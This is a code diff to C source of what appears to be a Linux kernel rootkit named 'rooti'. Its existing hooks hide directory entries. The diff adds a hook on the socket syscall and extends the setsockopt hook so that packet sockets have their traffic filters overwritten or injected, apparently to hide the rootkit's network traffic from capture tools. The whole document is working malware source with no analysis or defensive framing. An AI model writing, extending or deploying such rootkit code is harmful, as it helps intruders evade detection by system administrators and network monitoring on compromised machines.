@@ -53,6 +53,7 @@ static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
 static asmlinkage long (*orig_dup3)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
+static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
 static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);
 
 // References to the original file operations which we are hooking
@@ -200,6 +201,26 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
 }
 
+static asmlinkage long hook_socket(const struct pt_regs *regs)
+{
+    struct socket *sock;
+    int family = regs->di;
+    int fd = orig_socket(regs);
+    
+    if (fd == -1 || family != AF_PACKET) {
+        return fd;
+    }
+
+    sock = sock_from_file(fget(fd));
+    if (sock == NULL) {
+        ROOTI_DEBUG("sock_from_file() failed");
+        return fd;
+    }
+    rooti_overwrite_traffic_filter(sock->sk);
+
+    return fd;
+}
+
 static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
 {
     int fd = regs->di;
@@ -210,9 +231,7 @@ static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
     struct socket *sock;
     struct sock_fprog_kern user_fprog_kernel;
     int err = orig_setsockopt(regs);
-
-    // For now we only care about hooking the option to attach a socket filter
-    if (err || (optname != SO_ATTACH_FILTER)) {
+    if (err) {
         return err;
     }
 
@@ -222,12 +241,23 @@ static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
         return 0;
     }
 
-    err = rooti_copy_user_fprog(&user_fprog_kernel, optval, optlen);
-    if (err) {
-        return 0;
+    switch (optname) {
+    case SO_ATTACH_FILTER:
+        err = rooti_copy_user_fprog(&user_fprog_kernel, optval, optlen);
+        if (err) {
+            return 0;
+        }
+        rooti_inject_traffic_filter(sock->sk, &user_fprog_kernel);
+        kfree(user_fprog_kernel.filter);
+        break;
+        
+    case SO_DETACH_FILTER:
+        rooti_overwrite_traffic_filter(sock->sk);
+        break;
+
+    default:
+        break;
     }
-    rooti_inject_traffic_filter(sock->sk, &user_fprog_kernel);
-    kfree(user_fprog_kernel.filter);
 
     return 0;
 }
@@ -289,6 +319,7 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup3"), hook_dup3, &orig_dup3),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt)
 };
 
